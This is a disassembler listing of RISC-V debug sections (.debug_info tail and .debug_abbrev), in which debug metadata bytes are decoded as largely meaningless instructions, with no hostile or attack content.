    2348:	3200                	fld	fs0,32(a2)
    234a:	0839                	addi	a6,a6,14
    234c:	0000                	unimp
    234e:	5e01                	li	t3,-32
    2350:	00004933          	xor	s2,zero,zero
    2354:	0200                	addi	s0,sp,256
    2356:	6c91                	lui	s9,0x4
    2358:	2924                	fld	fs1,80(a0)
    235a:	0009                	c.nop	2
    235c:	0100                	addi	s0,sp,128
    235e:	1760                	addi	s0,sp,940
    2360:	0050                	addi	a2,sp,4
    2362:	0000                	unimp
    2364:	0309                	addi	t1,t1,2
    2366:	b4a4                	fsd	fs1,104(s1)
    2368:	8001                	srli	s0,s0,0x0
    236a:	0000                	unimp
    236c:	0000                	unimp
    236e:	9324                	0x9324
    2370:	0004                	0x4
    2372:	0100                	addi	s0,sp,128
    2374:	1761                	addi	a4,a4,-8
    2376:	0050                	addi	a2,sp,4
    2378:	0000                	unimp
    237a:	0309                	addi	t1,t1,2
    237c:	b4a0                	fsd	fs0,104(s1)
    237e:	8001                	srli	s0,s0,0x0
    2380:	0000                	unimp
    2382:	0000                	unimp
    2384:	0009233b          	0x9233b
    2388:	0100                	addi	s0,sp,128
    238a:	1762                	slli	a4,a4,0x38
    238c:	0049                	c.nop	18
    238e:	0000                	unimp
    2390:	3800                	fld	fs0,48(s0)
    2392:	07e9                	addi	a5,a5,26
    2394:	0000                	unimp
    2396:	4e01                	li	t3,0
    2398:	490c                	lw	a1,16(a0)
    239a:	0000                	unimp
    239c:	5a00                	lw	s0,48(a2)
    239e:	00800017          	auipc	zero,0x800
    23a2:	0000                	unimp
    23a4:	2200                	fld	fs0,0(a2)
    23a6:	0001                	nop
    23a8:	0000                	unimp
    23aa:	0000                	unimp
    23ac:	0100                	addi	s0,sp,128
    23ae:	6a9c                	ld	a5,16(a3)
    23b0:	0016                	c.slli	zero,0x5
    23b2:	3300                	fld	fs0,32(a4)
    23b4:	006e                	c.slli	zero,0x1b
    23b6:	4e01                	li	t3,0
    23b8:	491d                	li	s2,7
    23ba:	0000                	unimp
    23bc:	0300                	addi	s0,sp,384
    23be:	bc91                	j	1e12 <_tbss_end+0x1d8e>
    23c0:	327f                	0x327f
    23c2:	0000092f          	0x92f
    23c6:	4e01                	li	t3,0
    23c8:	00166a37          	lui	s4,0x166
    23cc:	0300                	addi	s0,sp,384
    23ce:	b091                	j	1c12 <_tbss_end+0x1b8e>
    23d0:	327f                	0x327f
    23d2:	0988                	addi	a0,sp,208
    23d4:	0000                	unimp
    23d6:	4e01                	li	t3,0
    23d8:	0016814b          	fnmsub.s	ft2,fa3,ft1,ft0,rne
    23dc:	0300                	addi	s0,sp,384
    23de:	a891                	j	2432 <_tbss_end+0x23ae>
    23e0:	347f                	0x347f
    23e2:	0069                	c.nop	26
    23e4:	5001                	c.li	zero,-32
    23e6:	00004907          	flq	fs2,0(zero) # 80239e <_tbss_end+0x80231a>
    23ea:	0200                	addi	s0,sp,256
    23ec:	6c91                	lui	s9,0x4
    23ee:	742c                	ld	a1,104(s0)
    23f0:	00800017          	auipc	zero,0x800
    23f4:	0000                	unimp
    23f6:	9c00                	0x9c00
    23f8:	0000                	unimp
    23fa:	0000                	unimp
    23fc:	0000                	unimp
    23fe:	3400                	fld	fs0,40(s0)
    2400:	3074                	fld	fa3,224(s0)
    2402:	0100                	addi	s0,sp,128
    2404:	0c54                	addi	a3,sp,532
    2406:	1670                	addi	a2,sp,812
    2408:	0000                	unimp
    240a:	9102                	jalr	sp
    240c:	3460                	fld	fs0,232(s0)
    240e:	3174                	fld	fa3,224(a0)
    2410:	0100                	addi	s0,sp,128
    2412:	1a54                	addi	a3,sp,308
    2414:	1670                	addi	a2,sp,812
    2416:	0000                	unimp
    2418:	9102                	jalr	sp
    241a:	3458                	fld	fa4,168(s0)
    241c:	3076                	fld	ft0,376(sp)
    241e:	0100                	addi	s0,sp,128
    2420:	0c55                	addi	s8,s8,21
    2422:	1670                	addi	a2,sp,812
    2424:	0000                	unimp
    2426:	9102                	jalr	sp
    2428:	3450                	fld	fa2,168(s0)
    242a:	3176                	fld	ft2,376(sp)
    242c:	0100                	addi	s0,sp,128
    242e:	1c55                	addi	s8,s8,-11
    2430:	1670                	addi	a2,sp,812
    2432:	0000                	unimp
    2434:	9102                	jalr	sp
    2436:	3448                	fld	fa0,168(s0)
    2438:	7165                	addi	sp,sp,-400
    243a:	0031                	c.nop	12
    243c:	5601                	li	a2,-32
    243e:	4909                	li	s2,2
    2440:	0000                	unimp
    2442:	0200                	addi	s0,sp,256
    2444:	4491                	li	s1,4
    2446:	6534                	ld	a3,72(a0)
    2448:	3271                	addiw	tp,tp,-4
    244a:	0100                	addi	s0,sp,128
    244c:	1956                	slli	s2,s2,0x35
    244e:	0049                	c.nop	18
    2450:	0000                	unimp
    2452:	9102                	jalr	sp
    2454:	0040                	addi	s0,sp,4
    2456:	1200                	addi	s0,sp,288
    2458:	7c08                	ld	a0,56(s0)
    245a:	0016                	c.slli	zero,0x5
    245c:	0200                	addi	s0,sp,256
    245e:	0408                	addi	a0,sp,512
    2460:	0000033b          	addw	t1,zero,zero
    2464:	7005                	c.lui	zero,0xfffe1
    2466:	0016                	c.slli	zero,0x5
    2468:	0400                	addi	s0,sp,512
    246a:	00001677          	0x1677
    246e:	0812                	slli	a6,a6,0x4
    2470:	00001677          	0x1677
    2474:	8838                	0x8838
    2476:	0009                	c.nop	2
    2478:	0100                	addi	s0,sp,128
    247a:	0c3e                	slli	s8,s8,0xf
    247c:	0049                	c.nop	18
    247e:	0000                	unimp
    2480:	1650                	addi	a2,sp,804
    2482:	8000                	0x8000
    2484:	0000                	unimp
    2486:	0000                	unimp
    2488:	010a                	slli	sp,sp,0x2
    248a:	0000                	unimp
    248c:	0000                	unimp
    248e:	0000                	unimp
    2490:	9c01                	subw	s0,s0,s0
    2492:	172d                	addi	a4,a4,-21
    2494:	0000                	unimp
    2496:	01006e33          	or	t3,zero,a6
    249a:	173e                	slli	a4,a4,0x2f
    249c:	0049                	c.nop	18
    249e:	0000                	unimp
    24a0:	9102                	jalr	sp
    24a2:	324c                	fld	fa1,160(a2)
    24a4:	0000092f          	0x92f
    24a8:	3e01                	addiw	t3,t3,-32
    24aa:	2d2e                	fld	fs10,200(sp)
    24ac:	02000017          	auipc	zero,0x2000
    24b0:	4091                	li	ra,4
    24b2:	8832                	mv	a6,a2
    24b4:	0009                	c.nop	2
    24b6:	0100                	addi	s0,sp,128
    24b8:	3f3e                	fld	ft10,488(sp)
    24ba:	00001733          	sll	a4,zero,zero
    24be:	7fb89103          	lh	sp,2043(a7) # 47fb <_tbss_end+0x4777>
    24c2:	6934                	ld	a3,80(a0)
    24c4:	0100                	addi	s0,sp,128
    24c6:	0740                	addi	s0,sp,900
    24c8:	0049                	c.nop	18
    24ca:	0000                	unimp
    24cc:	9102                	jalr	sp
    24ce:	2c6c                	fld	fa1,216(s0)
    24d0:	166a                	slli	a2,a2,0x3a
    24d2:	8000                	0x8000
    24d4:	0000                	unimp
    24d6:	0000                	unimp
    24d8:	0080                	addi	s0,sp,64
    24da:	0000                	unimp
    24dc:	0000                	unimp
    24de:	0000                	unimp
    24e0:	7434                	ld	a3,104(s0)
    24e2:	0030                	addi	a2,sp,8
    24e4:	4401                	li	s0,0
    24e6:	4909                	li	s2,2
    24e8:	0000                	unimp
    24ea:	0200                	addi	s0,sp,256
    24ec:	6891                	lui	a7,0x4
    24ee:	7434                	ld	a3,104(s0)
    24f0:	0031                	c.nop	12
    24f2:	4401                	li	s0,0
    24f4:	00004917          	auipc	s2,0x4
    24f8:	0200                	addi	s0,sp,256
    24fa:	6491                	lui	s1,0x4
    24fc:	7634                	ld	a3,104(a2)
    24fe:	0030                	addi	a2,sp,8
    2500:	4501                	li	a0,0
    2502:	4909                	li	s2,2
    2504:	0000                	unimp
    2506:	0200                	addi	s0,sp,256
    2508:	6091                	lui	ra,0x4
    250a:	7634                	ld	a3,104(a2)
    250c:	0031                	c.nop	12
    250e:	4501                	li	a0,0
    2510:	4919                	li	s2,6
    2512:	0000                	unimp
    2514:	0200                	addi	s0,sp,256
    2516:	5c91                	li	s9,-28
    2518:	0000                	unimp
    251a:	0812                	slli	a6,a6,0x4
    251c:	0055                	c.nop	21
    251e:	0000                	unimp
    2520:	0812                	slli	a6,a6,0x4
    2522:	005a                	c.slli	zero,0x16
    2524:	0000                	unimp
    2526:	0007a943          	fmadd.s	fs2,fa5,ft0,ft0,rdn
    252a:	0100                	addi	s0,sp,128
    252c:	16340d33          	0x16340d33
    2530:	8000                	0x8000
    2532:	0000                	unimp
    2534:	0000                	unimp
    2536:	001c                	0x1c
    2538:	0000                	unimp
    253a:	0000                	unimp
    253c:	0000                	unimp
    253e:	9c01                	subw	s0,s0,s0
    2540:	00001783          	lh	a5,0(zero) # 20024ac <_tbss_end+0x2002428>
    2544:	6d32                	ld	s10,264(sp)
    2546:	0006                	c.slli	zero,0x1
    2548:	0100                	addi	s0,sp,128
    254a:	064a2933          	0x64a2933
    254e:	0000                	unimp
    2550:	9102                	jalr	sp
    2552:	3368                	fld	fa0,224(a4)
    2554:	006e                	c.slli	zero,0x1b
    2556:	3301                	addiw	t1,t1,-32
    2558:	4935                	li	s2,13
    255a:	0000                	unimp
    255c:	0200                	addi	s0,sp,256
    255e:	6491                	lui	s1,0x4
    2560:	72726133          	0x72726133
    2564:	0100                	addi	s0,sp,128
    2566:	16814533          	0x16814533
    256a:	0000                	unimp
    256c:	9102                	jalr	sp
    256e:	0058                	addi	a4,sp,4
    2570:	8344                	0x8344
    2572:	0006                	c.slli	zero,0x1
    2574:	0100                	addi	s0,sp,128
    2576:	0d28                	addi	a0,sp,664
    2578:	1618                	addi	a4,sp,800
    257a:	8000                	0x8000
    257c:	0000                	unimp
    257e:	0000                	unimp
    2580:	001c                	0x1c
    2582:	0000                	unimp
    2584:	0000                	unimp
    2586:	0000                	unimp
    2588:	9c01                	subw	s0,s0,s0
    258a:	6d32                	ld	s10,264(sp)
    258c:	0006                	c.slli	zero,0x1
    258e:	0100                	addi	s0,sp,128
    2590:	2328                	fld	fa0,64(a4)
    2592:	064a                	slli	a2,a2,0x12
    2594:	0000                	unimp
    2596:	9102                	jalr	sp
    2598:	3368                	fld	fa0,224(a4)
    259a:	006e                	c.slli	zero,0x1b
    259c:	2801                	sext.w	a6,a6
    259e:	0000492f          	0x492f
    25a2:	0200                	addi	s0,sp,256
    25a4:	6491                	lui	s1,0x4
    25a6:	72726133          	0x72726133
    25aa:	0100                	addi	s0,sp,128
    25ac:	3c28                	fld	fa0,120(s0)
    25ae:	00001733          	sll	a4,zero,zero
    25b2:	9102                	jalr	sp
    25b4:	0058                	addi	a4,sp,4
	...

Disassembly of section .debug_abbrev:

0000000000000000 <.debug_abbrev>:
   0:	1101                	addi	sp,sp,-32
   2:	2501                	sext.w	a0,a0
   4:	130e                	slli	t1,t1,0x23
   6:	1b0e030b          	0x1b0e030b
   a:	110e                	slli	sp,sp,0x23
   c:	1201                	addi	tp,tp,-32
   e:	00171007          	0x171007
  12:	0200                	addi	s0,sp,256
  14:	0024                	addi	s1,sp,8
  16:	0b3e0b0b          	0xb3e0b0b
  1a:	00000e03          	lb	t3,0(zero) # 0 <_tdata_begin>
  1e:	03001603          	lh	a2,48(zero) # 30 <_tdata_begin+0x30>
  22:	3a0e                	fld	fs4,224(sp)
  24:	490b3b0b          	0x490b3b0b
  28:	04000013          	li	zero,64
  2c:	0024                	addi	s1,sp,8
  2e:	0b3e0b0b          	0xb3e0b0b
  32:	00000803          	lb	a6,0(zero) # 0 <_tdata_begin>
  36:	1605                	addi	a2,a2,-31
  38:	0300                	addi	s0,sp,384
  3a:	3a0e                	fld	fs4,224(sp)
  3c:	49053b0b          	0x49053b0b
  40:	06000013          	li	zero,96
  44:	0b0b0117          	auipc	sp,0xb0b0
  48:	0b3a                	slli	s6,s6,0xe
  4a:	13010b3b          	0x13010b3b
  4e:	0000                	unimp
  50:	03000d07          	0x3000d07
  54:	3a0e                	fld	fs4,224(sp)
  56:	490b3b0b          	0x490b3b0b
  5a:	08000013          	li	zero,128
  5e:	0101                	addi	sp,sp,0
  60:	1349                	addi	t1,t1,-14
  62:	1301                	addi	t1,t1,-32
  64:	0000                	unimp
  66:	2109                	addiw	sp,sp,2
  68:	4900                	lw	s0,16(a0)
  6a:	000b2f13          	slti	t5,s6,0
  6e:	0a00                	addi	s0,sp,272
  70:	0b0b0113          	addi	sp,s6,176
  74:	0b3a                	slli	s6,s6,0xe
  76:	13010b3b          	0x13010b3b
  7a:	0000                	unimp
  7c:	03000d0b          	0x3000d0b
  80:	3a0e                	fld	fs4,224(sp)
  82:	490b3b0b          	0x490b3b0b
  86:	000b3813          	sltiu	a6,s6,0
  8a:	0c00                	addi	s0,sp,528
  8c:	0b0b000f          	0xb0b000f
  90:	0000                	unimp
  92:	130d                	addi	t1,t1,-29
  94:	0301                	addi	t1,t1,0
  96:	0b0e                	slli	s6,s6,0x3
  98:	3b0b3a0b          	0x3b0b3a0b
  9c:	0013010b          	0x13010b
  a0:	0e00                	addi	s0,sp,784
  a2:	000d                	c.nop	3
  a4:	0b3a0803          	lb	a6,179(s4) # 1660b3 <_tbss_end+0x16602f>
  a8:	13490b3b          	0x13490b3b
  ac:	0b38                	addi	a4,sp,408
  ae:	0000                	unimp
  b0:	0b000f0f          	0xb000f0f
  b4:	0013490b          	0x13490b
  b8:	1000                	addi	s0,sp,32
  ba:	0e030113          	addi	sp,t1,224
  be:	0b3a050b          	0xb3a050b
  c2:	13010b3b          	0x13010b3b
  c6:	0000                	unimp
  c8:	0d11                	addi	s10,s10,4
  ca:	0300                	addi	s0,sp,384
  cc:	3a0e                	fld	fs4,224(sp)
  ce:	490b3b0b          	0x490b3b0b
  d2:	00053813          	sltiu	a6,a0,0
  d6:	1200                	addi	s0,sp,288
  d8:	0015                	c.nop	5
  da:	00001927          	0x1927
  de:	27011513          	0x27011513
  e2:	4919                	li	s2,6
  e4:	00130113          	addi	sp,t1,1
  e8:	1400                	addi	s0,sp,544
  ea:	0005                	c.nop	1
  ec:	1349                	addi	t1,t1,-14
  ee:	0000                	unimp
  f0:	2615                	addiw	a2,a2,5
  f2:	4900                	lw	s0,16(a0)
  f4:	16000013          	li	zero,352
  f8:	0e030113          	addi	sp,t1,224
  fc:	0b3a050b          	0xb3a050b
 100:	1301053b          	0x1301053b
 104:	0000                	unimp
 106:	03000d17          	auipc	s10,0x3000
 10a:	3a0e                	fld	fs4,224(sp)
 10c:	49053b0b          	0x49053b0b
 110:	000b3813          	sltiu	a6,s6,0
 114:	1800                	addi	s0,sp,48
 116:	000d                	c.nop	3
 118:	0b3a0e03          	lb	t3,179(s4)
 11c:	1349053b          	0x1349053b
 120:	0538                	addi	a4,sp,648
 122:	0000                	unimp
 124:	1319                	addi	t1,t1,-26
 126:	0301                	addi	t1,t1,0
 128:	0b0e                	slli	s6,s6,0x3
 12a:	3b0b3a0b          	0x3b0b3a0b
 12e:	0105                	addi	sp,sp,1
 130:	1a000013          	li	zero,416
 134:	0b0b0113          	addi	sp,s6,176
 138:	0b3a                	slli	s6,s6,0xe
 13a:	1301053b          	0x1301053b
 13e:	0000                	unimp
 140:	0b01131b          	0xb01131b
 144:	3a05                	addiw	s4,s4,-31
 146:	01053b0b          	0x1053b0b
 14a:	1c000013          	li	zero,448
 14e:	050b0117          	auipc	sp,0x50b0
 152:	0b3a                	slli	s6,s6,0xe
 154:	1301053b          	0x1301053b
 158:	0000                	unimp
 15a:	0d1d                	addi	s10,s10,7
 15c:	0300                	addi	s0,sp,384
 15e:	3a0e                	fld	fs4,224(sp)
 160:	49053b0b          	0x49053b0b
 164:	1e000013          	li	zero,480
 168:	0e030013          	addi	zero,t1,224
 16c:	193c                	addi	a5,sp,184
 16e:	0000                	unimp
 170:	151f 2701 0119      	0x1192701151f
 176:	20000013          	li	zero,512
 17a:	0034                	addi	a3,sp,8
 17c:	0b3a0e03          	lb	t3,179(s4)
 180:	1349053b          	0x1349053b
 184:	193c193f 21210000 	0x21210000193c193f
 18c:	4900                	lw	s0,16(a0)
 18e:	00062f13          	slti	t5,a2,0
 192:	2200                	fld	fs0,0(a2)
 194:	0034                	addi	a3,sp,8
 196:	0b3a0e03          	lb	t3,179(s4)
 19a:	13490b3b          	0x13490b3b
 19e:	1802193f 21230000 	0x212300001802193f
 1a6:	4900                	lw	s0,16(a0)
 1a8:	00052f13          	slti	t5,a0,0
 1ac:	2400                	fld	fs0,8(s0)
 1ae:	012e                	slli	sp,sp,0xb
 1b0:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 1b8:	13491927          	0x13491927
 1bc:	0111                	addi	sp,sp,4
 1be:	0712                	slli	a4,a4,0x4
 1c0:	1840                	addi	s0,sp,52
 1c2:	4296                	lw	t0,68(sp)
 1c4:	0119                	addi	sp,sp,6
 1c6:	25000013          	li	zero,592
 1ca:	0034                	addi	a3,sp,8
 1cc:	0b3a0e03          	lb	t3,179(s4)
 1d0:	13490b3b          	0x13490b3b
 1d4:	1802                	slli	a6,a6,0x20
 1d6:	0000                	unimp
 1d8:	0b26                	slli	s6,s6,0x9
 1da:	1101                	addi	sp,sp,-32
 1dc:	1201                	addi	tp,tp,-32
 1de:	27000007          	0x27000007
 1e2:	0034                	addi	a3,sp,8
 1e4:	0b3a0803          	lb	a6,179(s4)
 1e8:	13490b3b          	0x13490b3b
 1ec:	1802                	slli	a6,a6,0x20
 1ee:	0000                	unimp
 1f0:	0b28                	addi	a0,sp,408
 1f2:	1101                	addi	sp,sp,-32
 1f4:	1201                	addi	tp,tp,-32
 1f6:	00130107          	0x130107
 1fa:	2900                	fld	fs0,16(a0)
 1fc:	012e                	slli	sp,sp,0xb
 1fe:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 206:	01111927          	0x1111927
 20a:	0712                	slli	a4,a4,0x4
 20c:	1840                	addi	s0,sp,52
 20e:	01194297          	auipc	t0,0x1194
 212:	2a000013          	li	zero,672
 216:	0005                	c.nop	1
 218:	0b3a0803          	lb	a6,179(s4)
 21c:	13490b3b          	0x13490b3b
 220:	1802                	slli	a6,a6,0x20
 222:	0000                	unimp
 224:	3f002e2b          	0x3f002e2b
 228:	0319                	addi	t1,t1,6
 22a:	3a0e                	fld	fs4,224(sp)
 22c:	110b3b0b          	0x110b3b0b
 230:	1201                	addi	tp,tp,-32
 232:	97184007          	flq	ft0,-1679(a6)
 236:	1942                	slli	s2,s2,0x30
 238:	0000                	unimp
 23a:	052c                	addi	a1,sp,648
 23c:	0300                	addi	s0,sp,384
 23e:	3a0e                	fld	fs4,224(sp)
 240:	490b3b0b          	0x490b3b0b
 244:	00180213          	addi	tp,a6,1
 248:	2d00                	fld	fs0,24(a0)
 24a:	012e                	slli	sp,sp,0xb
 24c:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 254:	01111927          	0x1111927
 258:	0712                	slli	a4,a4,0x4
 25a:	1840                	addi	s0,sp,52
 25c:	00194297          	auipc	t0,0x194
 260:	0000                	unimp
 262:	1101                	addi	sp,sp,-32
 264:	1000                	addi	s0,sp,32
 266:	1106                	slli	sp,sp,0x21
 268:	1201                	addi	tp,tp,-32
 26a:	0301                	addi	t1,t1,0
 26c:	1b0e                	slli	s6,s6,0x23
 26e:	250e                	fld	fa0,192(sp)
 270:	130e                	slli	t1,t1,0x23
 272:	0005                	c.nop	1
 274:	0000                	unimp
 276:	1101                	addi	sp,sp,-32
 278:	1000                	addi	s0,sp,32
 27a:	1106                	slli	sp,sp,0x21
 27c:	1201                	addi	tp,tp,-32
 27e:	0301                	addi	t1,t1,0
 280:	1b0e                	slli	s6,s6,0x23
 282:	250e                	fld	fa0,192(sp)
 284:	130e                	slli	t1,t1,0x23
 286:	0005                	c.nop	1
 288:	0000                	unimp
 28a:	1101                	addi	sp,sp,-32
 28c:	2501                	sext.w	a0,a0
 28e:	130e                	slli	t1,t1,0x23
 290:	1b0e030b          	0x1b0e030b
 294:	110e                	slli	sp,sp,0x23
 296:	1201                	addi	tp,tp,-32
 298:	00171007          	0x171007
 29c:	0200                	addi	s0,sp,256
 29e:	0024                	addi	s1,sp,8
 2a0:	0b3e0b0b          	0xb3e0b0b
 2a4:	00000e03          	lb	t3,0(zero) # 0 <_tdata_begin>
 2a8:	0b002403          	lw	s0,176(zero) # b0 <_tbss_end+0x2c>
 2ac:	030b3e0b          	0x30b3e0b
 2b0:	0008                	0x8
 2b2:	0400                	addi	s0,sp,512
 2b4:	0035                	c.nop	13
 2b6:	1349                	addi	t1,t1,-14
 2b8:	0000                	unimp
 2ba:	2605                	addiw	a2,a2,1
 2bc:	4900                	lw	s0,16(a0)
 2be:	06000013          	li	zero,96
 2c2:	0016                	c.slli	zero,0x5
 2c4:	0b3a0e03          	lb	t3,179(s4)
 2c8:	0b390b3b          	0xb390b3b
 2cc:	1349                	addi	t1,t1,-14
 2ce:	0000                	unimp
 2d0:	03001607          	0x3001607
 2d4:	3a0e                	fld	fs4,224(sp)
 2d6:	39053b0b          	0x39053b0b
 2da:	0013490b          	0x13490b
 2de:	0800                	addi	s0,sp,16
 2e0:	0b0b0117          	auipc	sp,0xb0b0
 2e4:	0b3a                	slli	s6,s6,0xe
 2e6:	0b390b3b          	0xb390b3b
 2ea:	1301                	addi	t1,t1,-32
 2ec:	0000                	unimp
 2ee:	0d09                	addi	s10,s10,2
 2f0:	0300                	addi	s0,sp,384
 2f2:	3a0e                	fld	fs4,224(sp)
 2f4:	390b3b0b          	0x390b3b0b
 2f8:	0013490b          	0x13490b
 2fc:	0a00                	addi	s0,sp,272
 2fe:	0101                	addi	sp,sp,0
 300:	1349                	addi	t1,t1,-14
 302:	1301                	addi	t1,t1,-32
 304:	0000                	unimp
 306:	4900210b          	0x4900210b
 30a:	000b2f13          	slti	t5,s6,0
 30e:	0c00                	addi	s0,sp,528
 310:	0b0b0113          	addi	sp,s6,176
 314:	0b3a                	slli	s6,s6,0xe
 316:	0b390b3b          	0xb390b3b
 31a:	1301                	addi	t1,t1,-32
 31c:	0000                	unimp
 31e:	0d0d                	addi	s10,s10,3
 320:	0300                	addi	s0,sp,384
 322:	3a0e                	fld	fs4,224(sp)
 324:	390b3b0b          	0x390b3b0b
 328:	3813490b          	0x3813490b
 32c:	0e00000b          	0xe00000b
 330:	0b0b000f          	0xb0b000f
 334:	0000                	unimp
 336:	0b000f0f          	0xb000f0f
 33a:	000e030b          	0xe030b
 33e:	1000                	addi	s0,sp,32
 340:	0e030113          	addi	sp,t1,224
 344:	0b3a0b0b          	0xb3a0b0b
 348:	0b390b3b          	0xb390b3b
 34c:	1301                	addi	t1,t1,-32
 34e:	0000                	unimp
 350:	0d11                	addi	s10,s10,4
 352:	0300                	addi	s0,sp,384
 354:	3a08                	fld	fa0,48(a2)
 356:	390b3b0b          	0x390b3b0b
 35a:	3813490b          	0x3813490b
 35e:	1200000b          	0x1200000b
 362:	0b0b000f          	0xb0b000f
 366:	1349                	addi	t1,t1,-14
 368:	0000                	unimp
 36a:	03011313          	slli	t1,sp,0x30
 36e:	0b0e                	slli	s6,s6,0x3
 370:	3a05                	addiw	s4,s4,-31
 372:	390b3b0b          	0x390b3b0b
 376:	0013010b          	0x13010b
 37a:	1400                	addi	s0,sp,544
 37c:	000d                	c.nop	3
 37e:	0b3a0e03          	lb	t3,179(s4)
 382:	0b390b3b          	0xb390b3b
 386:	1349                	addi	t1,t1,-14
 388:	0538                	addi	a4,sp,648
 38a:	0000                	unimp
 38c:	1515                	addi	a0,a0,-27
 38e:	2700                	fld	fs0,8(a4)
 390:	0019                	c.nop	6
 392:	1600                	addi	s0,sp,800
 394:	0115                	addi	sp,sp,5
 396:	13491927          	0x13491927
 39a:	1301                	addi	t1,t1,-32
 39c:	0000                	unimp
 39e:	49000517          	auipc	a0,0x49000
 3a2:	18000013          	li	zero,384
 3a6:	0e030113          	addi	sp,t1,224
 3aa:	0b3a050b          	0xb3a050b
 3ae:	0b39053b          	0xb39053b
 3b2:	1301                	addi	t1,t1,-32
 3b4:	0000                	unimp
 3b6:	0d19                	addi	s10,s10,6
 3b8:	0300                	addi	s0,sp,384
 3ba:	3a0e                	fld	fs4,224(sp)
 3bc:	39053b0b          	0x39053b0b
 3c0:	3813490b          	0x3813490b
 3c4:	1a00000b          	0x1a00000b
 3c8:	000d                	c.nop	3
 3ca:	0b3a0e03          	lb	t3,179(s4)
 3ce:	0b39053b          	0xb39053b
 3d2:	1349                	addi	t1,t1,-14
 3d4:	0538                	addi	a4,sp,648
 3d6:	0000                	unimp
 3d8:	0301131b          	0x301131b
 3dc:	0b0e                	slli	s6,s6,0x3
 3de:	3b0b3a0b          	0x3b0b3a0b
 3e2:	3905                	addiw	s2,s2,-31
 3e4:	0013010b          	0x13010b
 3e8:	1c00                	addi	s0,sp,560
 3ea:	0b0b0113          	addi	sp,s6,176
 3ee:	0b3a                	slli	s6,s6,0xe
 3f0:	0b39053b          	0xb39053b
 3f4:	1301                	addi	t1,t1,-32
 3f6:	0000                	unimp
 3f8:	131d                	addi	t1,t1,-25
 3fa:	0b01                	addi	s6,s6,0
 3fc:	3a05                	addiw	s4,s4,-31
 3fe:	39053b0b          	0x39053b0b
 402:	0013010b          	0x13010b
 406:	1e00                	addi	s0,sp,816
 408:	050b0117          	auipc	sp,0x50b0
 40c:	0b3a                	slli	s6,s6,0xe
 40e:	0b39053b          	0xb39053b
 412:	1301                	addi	t1,t1,-32
 414:	0000                	unimp
 416:	0d1f 0300 3a0e      	0x3a0e03000d1f
 41c:	39053b0b          	0x39053b0b
 420:	0013490b          	0x13490b
 424:	2000                	fld	fs0,0(s0)
 426:	0e030013          	addi	zero,t1,224
 42a:	193c                	addi	a5,sp,184
 42c:	0000                	unimp
 42e:	1521                	addi	a0,a0,-24
 430:	2701                	sext.w	a4,a4
 432:	0119                	addi	sp,sp,6
 434:	22000013          	li	zero,544
 438:	0034                	addi	a3,sp,8
 43a:	0b3a0e03          	lb	t3,179(s4)
 43e:	0b39053b          	0xb39053b
 442:	1349                	addi	t1,t1,-14
 444:	193c193f 34230000 	0x34230000193c193f
 44c:	0300                	addi	s0,sp,384
 44e:	3a0e                	fld	fs4,224(sp)
 450:	390b3b0b          	0x390b3b0b
 454:	3f13490b          	0x3f13490b
 458:	3c19                	addiw	s8,s8,-26
 45a:	0019                	c.nop	6
 45c:	2400                	fld	fs0,8(s0)
 45e:	0034                	addi	a3,sp,8
 460:	0b3a0e03          	lb	t3,179(s4)
 464:	0b390b3b          	0xb390b3b
 468:	1349                	addi	t1,t1,-14
 46a:	1802                	slli	a6,a6,0x20
 46c:	0000                	unimp
 46e:	2e25                	addiw	t3,t3,9
 470:	3f01                	addiw	t5,t5,-32
 472:	0319                	addi	t1,t1,6
 474:	3a0e                	fld	fs4,224(sp)
 476:	39053b0b          	0x39053b0b
 47a:	4919270b          	0x4919270b
 47e:	12011113          	0x12011113
 482:	97184007          	flq	ft0,-1679(a6)
 486:	1942                	slli	s2,s2,0x30
 488:	1301                	addi	t1,t1,-32
 48a:	0000                	unimp
 48c:	0526                	slli	a0,a0,0x9
 48e:	0300                	addi	s0,sp,384
 490:	3a08                	fld	fa0,48(a2)
 492:	39053b0b          	0x39053b0b
 496:	0213490b          	0x213490b
 49a:	0018                	0x18
 49c:	2700                	fld	fs0,8(a4)
 49e:	0034                	addi	a3,sp,8
 4a0:	0b3a0803          	lb	a6,179(s4)
 4a4:	0b39053b          	0xb39053b
 4a8:	1349                	addi	t1,t1,-14
 4aa:	1802                	slli	a6,a6,0x20
 4ac:	0000                	unimp
 4ae:	3428                	fld	fa0,104(s0)
 4b0:	0300                	addi	s0,sp,384
 4b2:	3a0e                	fld	fs4,224(sp)
 4b4:	39053b0b          	0x39053b0b
 4b8:	0213490b          	0x213490b
 4bc:	0018                	0x18
 4be:	2900                	fld	fs0,16(a0)
 4c0:	012e                	slli	sp,sp,0xb
 4c2:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 4ca:	0b39                	addi	s6,s6,14
 4cc:	13491927          	0x13491927
 4d0:	0111                	addi	sp,sp,4
 4d2:	0712                	slli	a4,a4,0x4
 4d4:	1840                	addi	s0,sp,52
 4d6:	01194297          	auipc	t0,0x1194
 4da:	2a000013          	li	zero,672
 4de:	0005                	c.nop	1
 4e0:	0b3a0e03          	lb	t3,179(s4)
 4e4:	0b39053b          	0xb39053b
 4e8:	1349                	addi	t1,t1,-14
 4ea:	1802                	slli	a6,a6,0x20
 4ec:	0000                	unimp
 4ee:	11010b2b          	0x11010b2b
 4f2:	1201                	addi	tp,tp,-32
 4f4:	00130107          	0x130107
 4f8:	2c00                	fld	fs0,24(s0)
 4fa:	0111010b          	0x111010b
 4fe:	0712                	slli	a4,a4,0x4
 500:	0000                	unimp
 502:	262d                	addiw	a2,a2,11
 504:	0000                	unimp
 506:	2e00                	fld	fs0,24(a2)
 508:	012e                	slli	sp,sp,0xb
 50a:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 512:	0b39                	addi	s6,s6,14
 514:	13491927          	0x13491927
 518:	0111                	addi	sp,sp,4
 51a:	0712                	slli	a4,a4,0x4
 51c:	1840                	addi	s0,sp,52
 51e:	4296                	lw	t0,68(sp)
 520:	0119                	addi	sp,sp,6
 522:	2f000013          	li	zero,752
 526:	0018                	0x18
 528:	0000                	unimp
 52a:	2e30                	fld	fa2,88(a2)
 52c:	0301                	addi	t1,t1,0
 52e:	3a0e                	fld	fs4,224(sp)
 530:	39053b0b          	0x39053b0b
 534:	1119270b          	0x1119270b
 538:	1201                	addi	tp,tp,-32
 53a:	48184007          	flq	ft0,1153(a6)
 53e:	9718                	0x9718
 540:	1942                	slli	s2,s2,0x30
 542:	0000                	unimp
 544:	2e31                	addiw	t3,t3,12
